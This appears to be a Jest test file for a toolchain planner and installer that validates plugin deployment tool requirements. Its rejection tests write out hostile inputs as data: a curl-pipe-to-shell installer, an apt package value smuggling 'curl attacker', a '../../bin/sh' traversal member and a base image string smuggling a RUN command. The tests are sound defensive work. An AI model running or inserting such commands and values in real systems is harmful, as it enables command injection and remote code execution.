/** @jest-environment node */
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import vm from 'node:vm';
import crypto from 'node:crypto';
import {execFileSync} from 'node:child_process';
import {createToolchainPlan,validateToolRequirement} from '../../src/utils/plugins/exporting/toolchainPlan';
const scope=(commands,id='tools')=>({scope:id,allowedExecutables:commands,allowedCwdRoots:['/project'],allowedEnvKeys:[]});
const packageSource=tools=>JSON.stringify({fdo:{deployment:{schemaVersion:1,tools}}});

test('one legacy CLI family is inferred across desktop executable paths',()=>{
    const plan=createToolchainPlan('{}',[scope(['/opt/homebrew/bin/az','/usr/local/bin/az','C:\\Azure\\az.exe'])]);
    expect(plan.tools).toHaveLength(1);expect(plan.tools[0]).toMatchObject({id:'azure-cli',version:'2.91.0',source:'inferred-single-tool-scope'});
    expect(Object.values(plan.executables)).toEqual(['/usr/bin/az','/usr/bin/az','/usr/bin/az']);
    expect(plan.unresolved).toEqual([]);
});

test('a permission to use alternatives does not install all of them',()=>{
    const scopes=[scope(['/usr/bin/az','/usr/bin/aws','/usr/bin/jq'])];
    const inferred=createToolchainPlan('{}',scopes);expect(inferred.tools).toEqual([]);expect(inferred.unresolved[0].scope).toBe('tools');
    const declared=createToolchainPlan(packageSource([{id:'aws-cli',version:'>=2 <3'}]),scopes);
    expect(declared.tools.map(tool=>tool.id)).toEqual(['aws-cli']);expect(declared.unresolved).toEqual([]);expect(declared.executables).toEqual({'/usr/bin/aws':'/usr/bin/aws'});
});

test('network permissions do not invent CLI requirements and explicit empty declarations are respected',()=>{
    expect(createToolchainPlan('{}',[],['system.network','system.network.https']).tools).toEqual([]);
    expect(createToolchainPlan(packageSource([]),[scope(['/usr/bin/az'])]).tools).toEqual([]);
    const missing=createToolchainPlan('{}',[],['system.process.scope.custom']);expect(missing.unresolved[0]).toMatchObject({scope:'custom',commands:[]});
});

test('unknown binaries retain an actionable definition requirement',()=>{
    const plan=createToolchainPlan('{}',[scope(['/opt/vendor/bin/vendor-cli'])]);
    expect(plan.tools[0]).toMatchObject({id:'vendor-cli',installer:null,status:'needs-definition'});expect(plan.warnings).toHaveLength(1);
});

test('package requirements are validated without accepting shell installers or arbitrary package arguments',()=>{
    expect(validateToolRequirement({id:'postgres-client',command:'psql',version:'^15',executable:'/usr/bin/psql',installer:{type:'apt',packages:['postgresql-client-15']}})).toMatchObject({commands:['psql'],installer:{type:'apt',packages:['postgresql-client-15']}});
    expect(()=>validateToolRequirement({id:'evil',command:'evil',installer:{type:'shell',script:'curl example | sh'}})).toThrow('shell installers');
    expect(()=>validateToolRequirement({id:'evil',command:'evil',executable:'/usr/bin/evil',installer:{type:'apt',packages:['jq; curl attacker']}})).toThrow('package specification');
    expect(()=>validateToolRequirement({id:'azure-cli',version:'1.0.0'})).toThrow('provides 2.91.0');
    expect(()=>createToolchainPlan(packageSource([{id:'git'},{id:'git'}]),[])).toThrow('Duplicate');
});

const artifactRequirement=(changes={})=>({id:'vendor-cli',command:'vendor-cli',version:'1.2.3',installer:{type:'artifact',platforms:{'linux/amd64':{url:'https://vendor.example/tool',sha256:'a'.repeat(64),format:'file',...changes}}}});
test('artifacts require a platform-specific HTTPS source, checksum and safe member',()=>{
    expect(validateToolRequirement(artifactRequirement()).executable).toBe('/opt/fdo-tools/bin/vendor-cli');
    for(const changes of [{sha256:''},{url:'http://vendor.example/tool'},{url:'https://user:secret@vendor.example/tool'},{url:'https://vendor.example/tool?token=secret'},{format:'tar.gz',member:'../../bin/sh'}])expect(()=>validateToolRequirement(artifactRequirement(changes))).toThrow();
});

function simulatedInstaller({checksum,artifactBytes=Buffer.from('verified executable'),arch='x64',probeVersion='1.2.3'}) {
    const {parse}=require('@babel/parser'),source=fs.readFileSync(path.resolve('src/utils/plugins/exporting/toolRuntime.js'),'utf8');
    const ast=parse(source,{sourceType:'module'}),node=ast.program.body[0].declaration;
    const plan={schemaVersion:1,basePackages:[],unresolved:[],tools:[{...validateToolRequirement(artifactRequirement({sha256:checksum || crypto.createHash('sha256').update(artifactBytes).digest('hex')})),aliases:[]}]};
    const files=new Map([['/project/deployment/toolchain.json',JSON.stringify(plan)]]),commands=[];
    const fakeFs={readFileSync:file=>{if(!files.has(file))throw Error('missing');return files.get(file);},writeFileSync:(file,value)=>files.set(file,value),mkdirSync(){},chmodSync(){},mkdtempSync:()=>'/tmp/tool',rmSync(){}};
    const sandbox={Buffer,URL,AbortSignal,process:{platform:'linux',arch,env:{PATH:'/usr/bin:/bin',AZURE_CLIENT_SECRET:'must-not-reach-version-probe'}},__dirname:'/project/runtime',fetch:async()=>({ok:true,status:200,body:{async *[Symbol.asyncIterator](){yield artifactBytes;}}}),require:name=>{
        if(name==='node:fs')return fakeFs;
        if(name==='node:child_process')return {spawnSync:(command,args,options)=>{commands.push({command,args});if(options.env?.AZURE_CLIENT_SECRET)throw Error('credential leaked into probe');return {status:0,stdout:'vendor-cli '+probeVersion,stderr:''};}};
        if(name==='node:path')return path.posix;if(name==='node:crypto')return crypto;if(name==='node:os')return {tmpdir:()=>'/tmp'};
        if(name==='/project/runtime/tool-semver.cjs')return {coerce:require('semver/functions/coerce'),satisfies:require('semver/functions/satisfies')};
        throw Error(name);
    }};
    const runtime=vm.runInNewContext('('+source.slice(node.start,node.end)+')()',sandbox);
    return {runtime,files,commands};
}

test('verified artifacts are installed and version receipts contain no credentials',async()=>{
    const {runtime,files,commands}=simulatedInstaller({});const result=await runtime.install();
    expect(result.ok).toBe(true);expect(files.get('/opt/fdo-tools/bin/vendor-cli').toString()).toBe('verified executable');
    expect(commands).toEqual([{command:'/opt/fdo-tools/bin/vendor-cli',args:['--version']}]);
    expect(JSON.parse(files.get('/project/deployment/toolchain.lock.json')).tools[0]).toMatchObject({id:'vendor-cli',version:'1.2.3',status:'ready'});
});

test('wrong checksums and missing CPU platforms fail before installing or executing a tool',async()=>{
    const invalid=simulatedInstaller({checksum:'0'.repeat(64)});await expect(invalid.runtime.install()).rejects.toThrow('SHA-256');expect(invalid.commands).toEqual([]);expect(invalid.files.has('/opt/fdo-tools/bin/vendor-cli')).toBe(false);
    const arm=simulatedInstaller({arch:'arm64'});await expect(arm.runtime.install()).rejects.toThrow('no artifact for linux/arm64');expect(arm.commands).toEqual([]);
});

test('a version mismatch fails the build with an actionable requirement',async()=>{
    const {runtime,files}=simulatedInstaller({probeVersion:'2.0.0'});await expect(runtime.install()).rejects.toThrow('Expected 1.2.3; found 2.0.0');expect(files.has('/project/deployment/toolchain.lock.json')).toBe(false);
});

test('the generated checker can verify a real executable without installing anything',()=>{
    const root=fs.mkdtempSync(path.join(os.tmpdir(),'tool-doctor-'));
    try {
        fs.mkdirSync(path.join(root,'runtime'));fs.mkdirSync(path.join(root,'deployment'));
        const source=fs.readFileSync(path.resolve('src/utils/plugins/exporting/toolRuntime.js'),'utf8').replace('export function','function');
        fs.writeFileSync(path.join(root,'runtime/tools.cjs'),source+'\nmodule.exports=toolRuntime();');
        fs.writeFileSync(path.join(root,'runtime/tool-semver.cjs'),`module.exports={coerce:require(${JSON.stringify(require.resolve('semver/functions/coerce'))}),satisfies:require(${JSON.stringify(require.resolve('semver/functions/satisfies'))})};`);
        fs.writeFileSync(path.join(root,'deployment/toolchain.json'),JSON.stringify({schemaVersion:1,unresolved:[],tools:[{id:'node',executable:process.execPath,aliases:[],version:'>=24',versionArgs:['--version']}]}));
        const output=execFileSync(process.execPath,['-e',"console.log(JSON.stringify(require('./runtime/tools.cjs').check()))"],{cwd:root,encoding:'utf8'});expect(JSON.parse(output)).toMatchObject({ok:true,tools:[{id:'node',status:'ready'}]});
    }finally{fs.rmSync(root,{recursive:true,force:true});}
});

test('multi-file CLIs can come from an explicit immutable Node/Debian base image',()=>{
    const declaration={schemaVersion:1,baseImage:'registry.example/node-cloud@sha256:'+'a'.repeat(64),tools:[{id:'cloud-tool',command:'cloud-tool',executable:'/opt/cloud/bin/cloud-tool',version:'>=1',installer:{type:'provided'}}]};
    const plan=createToolchainPlan(JSON.stringify({fdo:{deployment:declaration}}),[scope(['/desktop/cloud-tool'])]);
    expect(plan.baseImage).toBe(declaration.baseImage);expect(plan.tools[0]).toMatchObject({installer:{type:'provided'},executable:'/opt/cloud/bin/cloud-tool'});
    for(const baseImage of ['node:latest','node:24\nRUN echo unsafe','image@sha256:invalid'])expect(()=>createToolchainPlan(JSON.stringify({fdo:{deployment:{...declaration,baseImage}}}),[])).toThrow('immutable image reference');
});
